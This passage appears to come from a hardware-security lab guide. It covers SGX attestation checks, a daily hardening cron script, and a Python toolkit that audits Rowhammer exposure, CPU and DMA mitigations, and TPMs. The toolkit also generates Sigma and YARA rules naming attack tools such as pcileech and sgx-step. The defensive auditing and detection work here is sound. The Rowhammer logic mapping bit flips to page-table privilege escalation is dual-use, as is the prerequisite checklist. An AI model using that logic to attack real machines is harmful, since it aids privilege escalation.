                f"MRENCLAVE {mrenclave.hex()[:16]}... not in allowlist "
                f"(unknown or unauthorized enclave binary)"
            )
        
        # 3. Check signer identity
        mrsigner = bytes.fromhex(quote_data.get('mrsigner', ''))
        if self.ALLOWED_MRSIGNERS and mrsigner not in self.ALLOWED_MRSIGNERS:
            issues.append(
                f"MRSIGNER {mrsigner.hex()[:16]}... not in allowlist "
                f"(unknown signing key)"
            )
        
        # 4. Check debug flag
        attributes = quote_data.get('attributes', {})
        if attributes.get('debug', False) and not self.ALLOW_DEBUG:
            issues.append("Debug enclave rejected (debug=true in production)")
        
        # 5. Check provision key access
        if attributes.get('provision_key', False) and not self.ALLOW_PROVISION_KEY:
            issues.append("Provision key access not authorized")
        
        # 6. Check quote freshness
        quote_time = quote_data.get('timestamp')
        if quote_time:
            age = (datetime.now(timezone.utc) - 
                   datetime.fromisoformat(quote_time)).total_seconds()
            if age > self.MAX_QUOTE_AGE_SECONDS:
                issues.append(
                    f"Quote age {age:.0f}s exceeds maximum {self.MAX_QUOTE_AGE_SECONDS}s "
                    f"(potential replay)"
                )
        
        # 7. Check TCB status
        tcb_status = quote_data.get('tcb_status', 'Unknown')
        if tcb_status not in ('UpToDate', 'SWHardeningNeeded'):
            issues.append(
                f"TCB status '{tcb_status}' indicates potential vulnerability "
                f"(expected: UpToDate or SWHardeningNeeded)"
            )
        
        if issues:
            return False, "; ".join(issues), {"issues": issues}
        
        return True, "Quote accepted — all policy checks passed", {}


class SGXHardeningChecklist:
    """Operational checklist for SGX/TDX deployment hardening"""
    
    CHECKS = [
        ("Latest microcode applied", "cat /proc/cpuinfo | grep -m1 microcode"),
        ("SMT disabled on SGX cores", "cat /sys/devices/system/cpu/smt/active"),
        ("L1TF mitigated", "cat /sys/devices/system/cpu/vulnerabilities/l1tf"),
        ("MDS mitigated", "cat /sys/devices/system/cpu/vulnerabilities/mds"),
        ("TSX disabled", "grep tsx /proc/cmdline"),
        ("Voltage MSRs locked", "rdmsr 0x150 2>/dev/null || echo locked"),
        ("RAPL restricted", "cat /proc/sys/kernel/perf_event_paranoid"),
        ("DCAP TCB current", "curl -s http://localhost:8081/sgx/certification/v4/tcbinfo"),
    ]
    
    def audit(self):
        """Run all hardening checks and report status"""
        import subprocess
        results = []
        
        for name, cmd in self.CHECKS:
            try:
                output = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5
                ).decode().strip()
                results.append((name, "PASS", output[:80]))
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
                results.append((name, "CHECK", str(e)[:80]))
        
        return results


if __name__ == "__main__":
    # Demo: verify a sample quote
    policy = AttestationPolicy()
    
    sample_quote = {
        "mrenclave": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
        "mrsigner": "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        "tcb_level": {"sgxtcbcomp01svn": 12, "sgxtcbcomp02svn": 14, "pcesvn": 13},
        "attributes": {"debug": False, "provision_key": False},
        "tcb_status": "OutOfDate",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    
    accepted, reason, details = policy.verify_quote(sample_quote)
    print(f"Attestation result: {'ACCEPTED' if accepted else 'REJECTED'}")
    print(f"Reason: {reason}")
```

**Step 3: SGX enclave hardening checklist deployment**

```bash
# Deploy the SGX hardening script as a cron job
cat << 'CRON' | sudo tee /etc/cron.daily/sgx-hardening-check
#!/bin/bash
# Daily SGX/TEE hardening verification
LOG="/var/log/hw-security/sgx_hardening_$(date +%Y%m%d).log"
ISSUES=0

echo "SGX Hardening Check — $(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$LOG"

# 1. Microcode currency
UCODE=$(grep -m1 'microcode' /proc/cpuinfo | awk '{print $NF}')
echo "Microcode: $UCODE" >> "$LOG"

# 2. L1TF mitigation (enclave protection)
L1TF=$(cat /sys/devices/system/cpu/vulnerabilities/l1tf)
echo "L1TF: $L1TF" >> "$LOG"
echo "$L1TF" | grep -qi "vulnerable" && ISSUES=$((ISSUES+1))

# 3. MDS mitigation (buffer clearing)
MDS=$(cat /sys/devices/system/cpu/vulnerabilities/mds)
echo "MDS: $MDS" >> "$LOG"
echo "$MDS" | grep -qi "vulnerable" && ISSUES=$((ISSUES+1))

# 4. AESM service running (required for attestation)
systemctl is-active aesmd >> "$LOG" 2>&1 || ISSUES=$((ISSUES+1))

# 5. Check enclave creation rate (anomaly detection)
SGX_CREATES=$(journalctl -u aesmd --since "24 hours ago" 2>/dev/null | grep -c "enclave" || echo 0)
echo "Enclave operations (24h): $SGX_CREATES" >> "$LOG"

# Alert if issues found
[ $ISSUES -gt 0 ] && \
    logger -t sgx-hardening -p auth.warning "SGX hardening: $ISSUES issues found — see $LOG"

exit $ISSUES
CRON
sudo chmod +x /etc/cron.daily/sgx-hardening-check
```

**Verification:** Attestation verifier rejects quotes with outdated TCB, unknown MRENCLAVE, or debug enclaves. Hardening checks run daily and alert on degraded protection.

---

## PART C: FRAMEWORK DEVELOPMENT

### Hardware Security Analysis Toolkit

**Objective:** Build a comprehensive Python framework that integrates Rowhammer scanning, SGX attestation verification, hardware vulnerability auditing, DMA protection assessment, and detection rule generation.

```python
#!/usr/bin/env python3
"""
hardware_security_toolkit.py — Comprehensive Hardware Security Analysis Framework

Modules:
  1. RowhammerAnalyzer     — DRAM vulnerability scanning and flip-map management
  2. SGXAttestationEngine  — DCAP quote verification and policy enforcement
  3. HardwareVulnAuditor   — CPU vulnerability mitigation assessment
  4. DMAProtectionAuditor  — IOMMU and Thunderbolt security validation
  5. DetectionRuleEngine   — Generate Sigma/YARA rules for hardware attacks
  6. TPMSecurityAnalyzer   — TPM configuration and timing analysis
  7. ReportGenerator       — Consolidated security report output

Usage:
    python3 hardware_security_toolkit.py --full-audit
    python3 hardware_security_toolkit.py --rowhammer-scan --iterations 1000000
    python3 hardware_security_toolkit.py --sgx-verify --quote quote.bin
    python3 hardware_security_toolkit.py --generate-rules --output rules/
"""

import argparse
import json
import os
import re
import subprocess
import struct
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional


# ══════════════════════════════════════════════════════════���════════════
# Module 1: Rowhammer Analysis
# ═══════════════════════════════════════════════════════════════════════

class FlipDirection(Enum):
    ZERO_TO_ONE = "0→1"
    ONE_TO_ZERO = "1→0"


@dataclass
class BitFlip:
    """Represents a single Rowhammer-induced bit flip"""
    row: int
    byte_offset: int
    bit_position: int
    direction: FlipDirection
    physical_address: Optional[int] = None
    aggressor_count: int = 2
    iterations_needed: int = 0
    timestamp: str = ""
    
    @property
    def pte_exploitable(self) -> bool:
        """Check if this flip could corrupt a PTE critical bit"""
        # PTE bit positions that enable privilege escalation
        pte_critical_bits = {
            0: "Present (enable mapping)",
            1: "Read/Write (grant write)",
            2: "User/Supervisor (user access to kernel)",
            7: "Page Size (4K→2M expansion)",
        }
        # PTE PFN bits (12-51) — any flip redirects mapping
        byte_in_pte = self.byte_offset % 8
        absolute_bit = byte_in_pte * 8 + self.bit_position
        
        if absolute_bit in pte_critical_bits:
            return True
        if 12 <= absolute_bit <= 51:
            return True
        return False
    
    def to_dict(self) -> dict:
        return {
            "row": self.row,
            "byte_offset": self.byte_offset,
            "bit_position": self.bit_position,
            "direction": self.direction.value,
            "physical_address": hex(self.physical_address) if self.physical_address else None,
            "aggressor_count": self.aggressor_count,
            "iterations_needed": self.iterations_needed,
            "pte_exploitable": self.pte_exploitable,
            "timestamp": self.timestamp,
        }


class RowhammerAnalyzer:
    """DRAM Rowhammer vulnerability analysis and flip-map management"""
    
    def __init__(self, flipmap_path: str = "flipmap.json"):
        self.flipmap_path = flipmap_path
        self.flips: list[BitFlip] = []
        self.dram_info: dict = {}
    
    def detect_dram_config(self) -> dict:
        """Detect DRAM configuration via dmidecode"""
        info = {"type": "unknown", "ecc": False, "manufacturer": "unknown",
                "speed": 0, "size_gb": 0}
        try:
            output = subprocess.check_output(
                ["sudo", "dmidecode", "-t", "memory"],
                stderr=subprocess.DEVNULL, timeout=5
            ).decode()
            
            if "DDR5" in output: info["type"] = "DDR5"
            elif "DDR4" in output: info["type"] = "DDR4"
            elif "DDR3" in output: info["type"] = "DDR3"
            
            if re.search(r"Error Correction.*?(Single|Multi|Chipkill)", output, re.I):
                info["ecc"] = True
            
            mfr = re.search(r"Manufacturer:\s*(\S+)", output)
            if mfr: info["manufacturer"] = mfr.group(1)
            
            speed = re.search(r"Speed:\s*(\d+)", output)
            if speed: info["speed"] = int(speed.group(1))
            
            sizes = re.findall(r"Size:\s*(\d+)\s*(?:MB|GB)", output)
            total_mb = sum(int(s) for s in sizes)
            info["size_gb"] = total_mb / 1024 if total_mb > 100 else total_mb
            
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            pass
        
        self.dram_info = info
        return info
    
    def check_prerequisites(self) -> dict:
        """Check Rowhammer attack prerequisites"""
        prereqs = {
            "hugepages_available": False,
            "hugepages_count": 0,
            "clflush_available": False,
            "pagemap_readable": False,
            "ksm_disabled": True,
            "thp_disabled": True,
        }
        
        try:
            hp = Path("/proc/meminfo").read_text()
            hp_match = re.search(r"HugePages_Free:\s+(\d+)", hp)
            if hp_match:
                prereqs["hugepages_count"] = int(hp_match.group(1))
                prereqs["hugepages_available"] = prereqs["hugepages_count"] > 0
        except: pass
        
        try:
            cpuinfo = Path("/proc/cpuinfo").read_text()
            prereqs["clflush_available"] = "clflush" in cpuinfo
        except: pass
        
        try:
            prereqs["pagemap_readable"] = os.access("/proc/self/pagemap", os.R_OK)
        except: pass
        
        try:
            ksm = Path("/sys/kernel/mm/ksm/run").read_text().strip()
            prereqs["ksm_disabled"] = (ksm == "0")
        except: pass
        
        try:
            thp = Path("/sys/kernel/mm/transparent_hugepage/enabled").read_text()
            prereqs["thp_disabled"] = "[never]" in thp
        except: pass
        
        return prereqs
    
    def load_flipmap(self) -> list[BitFlip]:
        """Load existing flip map from file"""
        if not os.path.exists(self.flipmap_path):
            return []
        
        with open(self.flipmap_path) as f:
            data = json.load(f)
        
        flips = []
        for flip_data in data.get("flips", []):
            flips.append(BitFlip(
                row=flip_data["row"],
                byte_offset=flip_data["byte_offset"],
                bit_position=flip_data["bit_position"],
                direction=FlipDirection(flip_data["direction"]),
                physical_address=int(flip_data["physical_address"], 16) if flip_data.get("physical_address") else None,
                aggressor_count=flip_data.get("aggressor_count", 2),
                iterations_needed=flip_data.get("iterations_needed", 0),
                timestamp=flip_data.get("timestamp", ""),
            ))
        
        self.flips = flips
        return flips
    
    def save_flipmap(self):
        """Save flip map to file"""
        data = {
            "scan_date": datetime.now(timezone.utc).isoformat(),
            "dram_info": self.dram_info,
            "total_flips": len(self.flips),
            "pte_exploitable_flips": sum(1 for f in self.flips if f.pte_exploitable),
            "flips": [f.to_dict() for f in self.flips],
        }
        with open(self.flipmap_path, "w") as f:
            json.dump(data, f, indent=2)
    
    def analyze_exploitability(self) -> dict:
        """Analyze flip map for exploitation potential"""
        if not self.flips:
            return {"exploitable": False, "reason": "No flips found"}
        
        pte_flips = [f for f in self.flips if f.pte_exploitable]
        
        return {
            "exploitable": len(pte_flips) > 0,
            "total_flips": len(self.flips),
            "pte_exploitable": len(pte_flips),
            "directions": {
                "0_to_1": sum(1 for f in self.flips if f.direction == FlipDirection.ZERO_TO_ONE),
                "1_to_0": sum(1 for f in self.flips if f.direction == FlipDirection.ONE_TO_ZERO),
            },
            "vulnerable_rows": len(set(f.row for f in self.flips)),
            "min_iterations": min((f.iterations_needed for f in self.flips if f.iterations_needed > 0), default=0),
            "trr_bypass_needed": any(f.aggressor_count > 2 for f in self.flips),
        }


# ═══════════════════════════════════════════════════════════════════════
# Module 2: SGX Attestation Engine
# ═══════════════════════════════════════════════════════════════════════

@dataclass
class AttestationResult:
    accepted: bool
    reason: str
    tcb_status: str = "Unknown"
    mrenclave: str = ""
    platform_id: str = ""
    issues: list = field(default_factory=list)


class SGXAttestationEngine:
    """DCAP attestation verification with configurable security policy"""
    
    def __init__(self, policy_path: Optional[str] = None):
        self.min_tcb = {
            "sgxtcbcomp01svn": 14,
            "sgxtcbcomp02svn": 14,
            "pcesvn": 13,
        }
        self.allowed_mrenclaves: set = set()
        self.allowed_mrsigners: set = set()
        self.max_quote_age_s = 300
        self.allow_debug = False
        
        if policy_path:
            self.load_policy(policy_path)
    
    def load_policy(self, path: str):
        with open(path) as f:
            policy = json.load(f)
        self.min_tcb = policy.get("min_tcb", self.min_tcb)
        self.allowed_mrenclaves = set(policy.get("allowed_mrenclaves", []))
        self.allowed_mrsigners = set(policy.get("allowed_mrsigners", []))
        self.max_quote_age_s = policy.get("max_quote_age_seconds", 300)
        self.allow_debug = policy.get("allow_debug", False)
    
    def verify_quote(self, quote_data: dict) -> AttestationResult:
        """Verify DCAP quote against security policy"""
        issues = []
        
        # TCB level check
        tcb = quote_data.get("tcb_level", {})
        for comp, min_val in self.min_tcb.items():
            actual = tcb.get(comp, 0)
            if actual < min_val:
                issues.append(f"TCB {comp}={actual} < required {min_val}")
        
        # MRENCLAVE allowlist
        mrenclave = quote_data.get("mrenclave", "")
        if self.allowed_mrenclaves and mrenclave not in self.allowed_mrenclaves:
            issues.append(f"MRENCLAVE not in allowlist")
        
        # Debug mode check
        attrs = quote_data.get("attributes", {})
        if attrs.get("debug", False) and not self.allow_debug:
            issues.append("Debug enclave rejected in production")
        
        # TCB status
        tcb_status = quote_data.get("tcb_status", "Unknown")
        if tcb_status in ("OutOfDate", "Revoked", "ConfigurationNeeded"):
            issues.append(f"TCB status: {tcb_status}")
        
        return AttestationResult(
            accepted=len(issues) == 0,
            reason="; ".join(issues) if issues else "All checks passed",
            tcb_status=tcb_status,
            mrenclave=mrenclave,
            issues=issues,
        )
    
    def check_sgx_capability(self) -> dict:
        """Check local platform SGX capability"""
        cap = {"sgx_supported": False, "sgx1": False, "sgx2": False,
               "epc_size_mb": 0, "flc_supported": False}
        
        try:
            output = subprocess.check_output(
                ["cpuid"], stderr=subprocess.DEVNULL, timeout=5
            ).decode()
            cap["sgx_supported"] = "SGX1 supported" in output
            cap["sgx1"] = "SGX1 supported = true" in output
            cap["sgx2"] = "SGX2 supported = true" in output
            
            epc_match = re.search(r"SGX EPC.*?size.*?(\d+)", output)
            if epc_match:
                cap["epc_size_mb"] = int(epc_match.group(1))
            
            cap["flc_supported"] = "SGX_LC" in output or "FLC" in output
        except: pass
        
        # Check device nodes
        cap["dev_enclave"] = os.path.exists("/dev/sgx_enclave") or os.path.exists("/dev/sgx/enclave")
        cap["dev_provision"] = os.path.exists("/dev/sgx_provision")
        
        return cap


# ═══════════════════════════════════════════════════════════════════════
# Module 3: Hardware Vulnerability Auditor
# ═══════════════════════════════════════════════════════════════════════

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class VulnFinding:
    name: str
    severity: Severity
    status: str
    detail: str
    cve: str = ""
    mitigation: str = ""


class HardwareVulnAuditor:
    """Audit CPU hardware vulnerability mitigations"""
    
    VULN_DIR = "/sys/devices/system/cpu/vulnerabilities"
    
    # Map vulnerability names to CVEs and impact descriptions
    VULN_DB = {
        "spectre_v1": {"cve": "CVE-2017-5753", "impact": "Bounds check bypass"},
        "spectre_v2": {"cve": "CVE-2017-5715", "impact": "Branch target injection"},
        "meltdown": {"cve": "CVE-2017-5754", "impact": "Rogue data cache load"},
        "spec_store_bypass": {"cve": "CVE-2018-3639", "impact": "Speculative store bypass"},
        "l1tf": {"cve": "CVE-2018-3615/3620/3646", "impact": "L1 Terminal Fault / Foreshadow"},
        "mds": {"cve": "CVE-2018-12126/12127/12130", "impact": "Microarchitectural Data Sampling"},
        "tsx_async_abort": {"cve": "CVE-2019-11135", "impact": "TSX Asynchronous Abort"},
        "mmio_stale_data": {"cve": "CVE-2022-21123/21125/21166", "impact": "MMIO stale data"},
        "retbleed": {"cve": "CVE-2022-29900/29901", "impact": "Return address prediction"},
        "gather_data_sampling": {"cve": "CVE-2022-40982", "impact": "Downfall/GDS"},
        "spec_rstack_overflow": {"cve": "CVE-2023-20569", "impact": "Inception/SRSO"},
        "reg_file_data_sampling": {"cve": "CVE-2023-28746", "impact": "RFDS"},
        "srbds": {"cve": "CVE-2020-0543", "impact": "Special Register Buffer Data Sampling"},
    }
    
    def audit_all(self) -> list[VulnFinding]:
        """Audit all known hardware vulnerabilities"""
        findings = []
        
        if not os.path.isdir(self.VULN_DIR):
            findings.append(VulnFinding(
                name="vulnerability_sysfs",
                severity=Severity.HIGH,
                status="MISSING",
                detail="Vulnerability sysfs not available — kernel too old or not configured",
            ))
            return findings
        
        for vuln_file in sorted(Path(self.VULN_DIR).iterdir()):
            name = vuln_file.name
            try:
                status = vuln_file.read_text().strip()
            except:
                status = "UNREADABLE"
            
            db_entry = self.VULN_DB.get(name, {})
            
            if "Not affected" in status:
                severity = Severity.INFO
            elif "Vulnerable" in status:
                severity = Severity.CRITICAL
            elif "Mitigation" in status:
                severity = Severity.LOW
            else:
                severity = Severity.MEDIUM
            
            findings.append(VulnFinding(
                name=name,
                severity=severity,
                status=status,
                detail=db_entry.get("impact", ""),
                cve=db_entry.get("cve", ""),
            ))
        
        # Additional checks beyond sysfs
        findings.extend(self._check_smt())
        findings.extend(self._check_microcode())
        findings.extend(self._check_tsx())
        
        return findings
    
    def _check_smt(self) -> list[VulnFinding]:
        try:
            smt = Path("/sys/devices/system/cpu/smt/active").read_text().strip()
            if smt == "1":
                return [VulnFinding(
                    name="smt_active",
                    severity=Severity.MEDIUM,
                    status="ENABLED",
                    detail="SMT active — MDS/L1TF/CacheOut cross-thread attacks possible",
                    mitigation="nosmt kernel parameter or BIOS disable",
                )]
        except: pass
        return []
    
    def _check_microcode(self) -> list[VulnFinding]:
        try:
            cpuinfo = Path("/proc/cpuinfo").read_text()
            ucode = re.search(r"microcode\s*:\s*(0x[0-9a-f]+|\d+)", cpuinfo)
            if ucode:
                return [VulnFinding(
                    name="microcode_version",
                    severity=Severity.INFO,
                    status=ucode.group(1),
                    detail="Verify against vendor's latest security advisory",
                )]
        except: pass
        return []
    
    def _check_tsx(self) -> list[VulnFinding]:
        try:
            cmdline = Path("/proc/cmdline").read_text()
            if "tsx=off" in cmdline:
                return [VulnFinding(
                    name="tsx_disabled",
                    severity=Severity.INFO,
                    status="tsx=off",
                    detail="TSX disabled — TAA mitigated at source",
                )]
            elif "tsx=on" in cmdline:
                return [VulnFinding(
                    name="tsx_enabled",
                    severity=Severity.MEDIUM,
                    status="tsx=on (explicit)",
                    detail="TSX enabled — TAA attack surface present",
                    mitigation="tsx=off kernel parameter",
                )]
        except: pass
        return []


# ═══════════════════════════════════════════════════════════════════════
# Module 4: DMA Protection Auditor
# ═══════════════════════════════════════════════════════════════════════

class DMAProtectionAuditor:
    """Assess IOMMU and Thunderbolt DMA protection"""
    
    def audit(self) -> list[VulnFinding]:
        findings = []
        findings.extend(self._check_iommu())
        findings.extend(self._check_thunderbolt())
        findings.extend(self._check_iommu_groups())
        return findings
    
    def _check_iommu(self) -> list[VulnFinding]:
        findings = []
        try:
            dmesg = subprocess.check_output(
                ["dmesg"], stderr=subprocess.DEVNULL, timeout=5
            ).decode()
            
            iommu_active = ("DMAR: IOMMU enabled" in dmesg or "AMD-Vi:" in dmesg)
            cmdline = Path("/proc/cmdline").read_text()
            
            if not iommu_active:
                findings.append(VulnFinding(
                    name="iommu_disabled",
                    severity=Severity.CRITICAL,
                    status="NO IOMMU",
                    detail="DMA attacks possible via PCIe/Thunderbolt",
                    mitigation="intel_iommu=on or amd_iommu=on in kernel cmdline",
                ))
            elif "iommu=pt" in cmdline:
                findings.append(VulnFinding(
                    name="iommu_passthrough",
                    severity=Severity.CRITICAL,
                    status="PASSTHROUGH",
                    detail="IOMMU in passthrough mode — DMA NOT isolated",
                    mitigation="Change to iommu=strict",
                ))
            else:
                findings.append(VulnFinding(
                    name="iommu_active",
                    severity=Severity.INFO,
                    status="ACTIVE",
                    detail="IOMMU enabled and enforcing",
                ))
        except: pass
        return findings
    
    def _check_thunderbolt(self) -> list[VulnFinding]:
        findings = []
        tb_path = Path("/sys/bus/thunderbolt/devices")
        if not tb_path.exists():
            return findings
        
        for dev_dir in tb_path.iterdir():
            sec_file = dev_dir / "security"
            if not sec_file.exists():
                continue
            
            try:
                level = sec_file.read_text().strip()
                if level == "none":
                    findings.append(VulnFinding(
                        name=f"thunderbolt_{dev_dir.name}",
                        severity=Severity.CRITICAL,
                        status="NONE",
                        detail="Thunderbolt DMA on connect — no authorization",
                        mitigation="Set Thunderbolt security to 'user' or 'secure' in BIOS",
                    ))
                elif level == "user":
                    findings.append(VulnFinding(
                        name=f"thunderbolt_{dev_dir.name}",
                        severity=Severity.LOW,
                        status="USER",
                        detail="Thunderbolt requires user authorization",
                    ))
            except: pass
        
        return findings
    
    def _check_iommu_groups(self) -> list[VulnFinding]:
        findings = []
        iommu_groups = Path("/sys/kernel/iommu_groups")
        if not iommu_groups.exists():
            return findings
        
        for group_dir in iommu_groups.iterdir():
            devices_dir = group_dir / "devices"
            if not devices_dir.exists():
                continue
            devices = list(devices_dir.iterdir())
            if len(devices) > 1:
                findings.append(VulnFinding(
                    name=f"iommu_group_{group_dir.name}_shared",
                    severity=Severity.MEDIUM,
                    status=f"{len(devices)} devices",
                    detail="Multi-device IOMMU group — potential DMA bypass between devices",
                    mitigation="ACS override patch or separate PCIe slots",
                ))
        
        return findings


# ═══════════════════════════════════════════════════════════════════════
# Module 5: Detection Rule Engine
# ═══════════════════════════════════════════════════════════════════════

class DetectionRuleEngine:
    """Generate Sigma and YARA rules for hardware attack detection"""
    
    def generate_sigma_rules(self) -> list[dict]:
        """Generate Sigma rules for hardware attack detection"""
        rules = []
        
        # Rule 1: Rowhammer via high page faults
        rules.append({
            "title": "Potential Rowhammer — Sustained High LLC Miss Rate",
            "id": "hw-001",
            "status": "experimental",
            "description": "Detects sustained high LLC miss rate indicative of Rowhammer or cache side-channel attack",
            "logsource": {"category": "performance_counter", "product": "linux"},
            "detection": {
                "selection": {"counter": "LLC-load-misses", "rate_per_second|gte": 1000000},
                "timeframe": "10s",
                "condition": "selection",
            },
            "level": "high",
            "tags": ["attack.privilege_escalation", "attack.t1068"],
            "falsepositives": ["Scientific workloads", "Database buffer warmup", "ML training"],
        })
        
        # Rule 2: Huge page allocation (Rowhammer prerequisite)
        rules.append({
            "title": "Large Huge Page Allocation — Rowhammer Prerequisite",
            "id": "hw-002",
            "status": "experimental",
            "description": "Detects large MAP_HUGETLB allocations that provide physical contiguity for Rowhammer",
            "logsource": {"category": "syscall", "product": "linux"},
            "detection": {
                "selection": {"syscall": "mmap", "flags|contains": "MAP_HUGETLB", "length|gte": 67108864},
                "condition": "selection",
            },
            "level": "medium",
            "tags": ["attack.privilege_escalation", "attack.t1068"],
            "falsepositives": ["DPDK", "JVM large pages", "PostgreSQL huge_pages"],
        })
        
        # Rule 3: SGX enclave from unexpected process
        rules.append({
            "title": "SGX Enclave Creation from Non-Standard Process",
            "id": "hw-003",
            "status": "experimental",
            "description": "Detects SGX enclave creation from processes not in the allowlist",
            "logsource": {"category": "file_access", "product": "linux"},
            "detection": {
                "selection": {"target|endswith": ["/dev/sgx_enclave", "/dev/sgx/enclave"]},
                "filter": {"process|endswith": ["/aesmd", "/gramine", "/sgx_app"]},
                "condition": "selection and not filter",
            },
            "level": "high",
            "tags": ["attack.execution", "attack.t1106"],
        })
        
        # Rule 4: Thunderbolt device hotplug
        rules.append({
            "title": "Thunderbolt Device Connected — DMA Attack Risk",
            "id": "hw-004",
            "status": "experimental",
            "description": "Detects Thunderbolt/PCIe device hotplug events that may indicate DMA attack",
            "logsource": {"category": "driver_load", "product": "linux"},
            "detection": {
                "selection": {"subsystem": "thunderbolt", "action": "add"},
                "condition": "selection",
            },
            "level": "medium",
            "tags": ["attack.credential_access", "attack.t1040"],
        })
        
        # Rule 5: RAPL energy counter access (PLATYPUS)
        rules.append({
            "title": "Frequent RAPL Energy Counter Access — PLATYPUS Indicator",
            "id": "hw-005",
            "status": "experimental",
            "description": "Detects high-frequency RAPL reads indicative of power-analysis attack",
            "logsource": {"category": "file_access", "product": "linux"},
            "detection": {
                "selection": {"target|contains": "powercap/intel-rapl", "target|endswith": "energy_uj"},
                "condition": "selection | count() > 1000",
                "timeframe": "60s",
            },
            "level": "high",
            "tags": ["attack.credential_access", "attack.t1552"],
        })
        
        return rules
    
    def generate_yara_rules(self) -> str:
        """Generate YARA rules for hardware attack tool detection"""
        return '''
rule Rowhammer_Exploit_Binary {
    meta:
        description = "Detects compiled Rowhammer exploit tools"
        date = "2025-01-15"
        severity = "high"
    strings:
        $clflush = { 0F AE 38 }
        $clflush2 = { 0F AE 3F }
        $mfence = { 0F AE F0 }
        $rdtscp = { 0F 01 F9 }
        $s1 = "rowhammer" ascii nocase
        $s2 = "/proc/self/pagemap" ascii
        $s3 = "MAP_HUGETLB" ascii
        $s4 = "hammer" ascii
    condition:
        uint16(0) == 0x457F and
        ((all of ($clflush*, $mfence, $rdtscp)) or
         (2 of ($s*) and ($mfence or $clflush)))
}

rule DMA_Attack_Tool {
    meta:
        description = "Detects DMA attack tool signatures"
        date = "2025-01-15"
        severity = "high"
    strings:
        $a = "pcileech" ascii nocase
        $b = "inception" ascii nocase
        $c = "memdump.raw" ascii
        $d = "WIN10_X64" ascii
        $e = "-device fpga" ascii
        $f = "--device firewire" ascii
        $g = "--device thunderbolt" ascii
    condition:
        2 of them
}

rule SGX_Attack_Framework {
    meta:
        description = "Detects SGX side-channel attack tools"
        date = "2025-01-15"
        severity = "high"
    strings:
        $a = "sgx-step" ascii nocase
        $b = "sgx_step" ascii nocase
        $c = "APIC timer" ascii
        $d = "enclave" ascii
        $e = "GPRSGX" ascii
        $f = "/dev/sgx" ascii
        $g = "single-step" ascii
    condition:
        uint16(0) == 0x457F and 3 of them
}

rule TPM_Attack_Tool {
    meta:
        description = "Detects TPM timing/fault attack tools"
        date = "2025-01-15"
        severity = "medium"
    strings:
        $a = "tpm-fail" ascii nocase
        $b = "faultpm" ascii nocase
        $c = "TPM2_Sign" ascii
        $d = "lattice" ascii
        $e = "nonce" ascii
        $f = "tpm2_sign" ascii
    condition:
        3 of them
}
'''
    
    def export_sigma(self, output_dir: str):
        """Export Sigma rules to individual YAML files"""
        import yaml
        os.makedirs(output_dir, exist_ok=True)
        
        for rule in self.generate_sigma_rules():
            filename = f"{rule['id']}_{rule['title'].lower().replace(' ', '_')[:40]}.yml"
            filepath = os.path.join(output_dir, filename)
            with open(filepath, "w") as f:
                yaml.dump(rule, f, default_flow_style=False, allow_unicode=True)
    
    def export_yara(self, output_path: str):
        """Export YARA rules to file"""
        with open(output_path, "w") as f:
            f.write(self.generate_yara_rules())


# ═══════════════════════════════════════════════════════════════════════
# Module 6: TPM Security Analyzer
# ═══════════════════════════════════════════════════════════════════════

class TPMSecurityAnalyzer:
    """TPM configuration assessment and vulnerability analysis"""
    
    def check_tpm_type(self) -> dict:
        """Identify TPM type and assess vulnerability profile"""
        info = {"present": False, "type": "unknown", "version": "",
                "manufacturer": "", "vulnerabilities": []}
        
        try:
            output = subprocess.check_output(
                ["tpm2_getcap", "properties-fixed"],
                stderr=subprocess.DEVNULL, timeout=10
            ).decode()
            
            info["present"] = True
            
            mfr = re.search(r"TPM_PT_MANUFACTURER.*?value.*?\"(\w+)\"", output)
            if mfr:
                info["manufacturer"] = mfr.group(1)
                if "INTC" in mfr.group(1):
                    info["type"] = "Intel fTPM"
                    info["vulnerabilities"].append("CVE-2019-11090 (TPM-FAIL timing)")
                    info["vulnerabilities"].append("faulTPM voltage glitch (physical)")
                elif "STM" in mfr.group(1):
                    info["type"] = "STMicro discrete"
                    info["vulnerabilities"].append("CVE-2019-16863 (TPM-FAIL)")
                    info["vulnerabilities"].append("SPI bus sniffing (physical)")
                elif "AMD" in mfr.group(1):
                    info["type"] = "AMD fTPM (PSP)"
                    info["vulnerabilities"].append("faulTPM/SVI2 voltage glitch")
            
            fw = re.search(r"TPM_PT_FIRMWARE_VERSION.*?value.*?(\S+)", output)
            if fw:
                info["version"] = fw.group(1)
                
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        return info
    
    def check_pcr_integrity(self) -> dict:
        """Read PCR values and assess boot integrity"""
        pcrs = {}
        try:
            output = subprocess.check_output(
                ["tpm2_pcrread", "sha256"],
                stderr=subprocess.DEVNULL, timeout=10
            ).decode()
            
            for match in re.finditer(r"(\d+)\s*:\s*0x([0-9A-Fa-f]+)", output):
                pcr_idx = int(match.group(1))
                pcr_val = match.group(2)
                pcrs[pcr_idx] = pcr_val
                
        except: pass
        
        assessment = {
            "pcrs": pcrs,
            "boot_integrity": "unknown",
            "secure_boot_measured": pcrs.get(7, "") != "0" * 64,
        }
        
        # PCR 0 = all zeros means measurement chain not active
        if pcrs.get(0, "0" * 64) == "0" * 64:
            assessment["boot_integrity"] = "NOT_MEASURED"
        else:
            assessment["boot_integrity"] = "MEASURED"
        
        return assessment


# ═══════════════════════════════════════════════════════════════════════
# Module 7: Report Generator
# ═══════════════════════════════════════════════════════════════════════

class ReportGenerator:
    """Generate consolidated hardware security report"""
    
    def __init__(self):
        self.sections = []
    
    def add_section(self, title: str, findings: list):
        self.sections.append({"title": title, "findings": findings})
    
    def generate_json(self, output_path: str):
        """Export report as JSON"""
        report = {
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "hostname": os.uname().nodename,
            "kernel": os.uname().release,
            "sections": self.sections,
        }
        with open(output_path, "w") as f:
